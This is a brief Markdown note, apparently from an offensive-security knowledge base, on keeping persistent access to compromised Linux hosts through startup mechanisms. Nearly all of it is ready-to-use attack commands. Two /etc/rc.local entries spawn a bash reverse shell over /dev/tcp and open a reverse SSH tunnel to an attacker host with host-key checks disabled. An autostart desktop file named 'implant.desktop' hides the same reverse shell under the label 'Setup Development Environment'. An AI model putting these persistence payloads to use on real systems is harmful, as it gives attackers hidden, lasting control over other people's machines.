---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - linux
---
# Startup

## 01 - Elevated

### 1.1 - Callback Shell

```
$ cat /etc/rc.local
#!/bin/sh -e
/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
exit 0
```

### 1.2 - Reverse SSH Tunneling

Refer to this [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x08 - Maintaining Access/Persistence/Linux/Remote Login/SSH/Manual/Living off the Land|section]] for more context.

```
$ cat /etc/rc.local
#!/bin/sh -e
nohup ssh -i /tmp/keys/id_rsa -NTfCqR [127.0.0.1]:<SOCKS_Proxy> -o "UserKnownHostsFile=/dev/null StrictHostKeyChecking=no" <username>@<attacker_IP>
exit 0
```

## 02 - Userland Desktop Entries

```
$ cat > ~/.config/autostart/implant.desktop << EOF
[Desktop Entry]
Type=Application
Name=Setup Development Environment
Exec=/bin/bash -c "/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
EOF
```

---
## References

### Backlinks

- [[03 - Malware Development/Global Helpers/Persistence/Linux/Autostart Locations]]

- [[Linux Post Exploitation Persistence References]]

- [[04 - Remote Port Forwarding|SSH: Remote Port Forwarding]]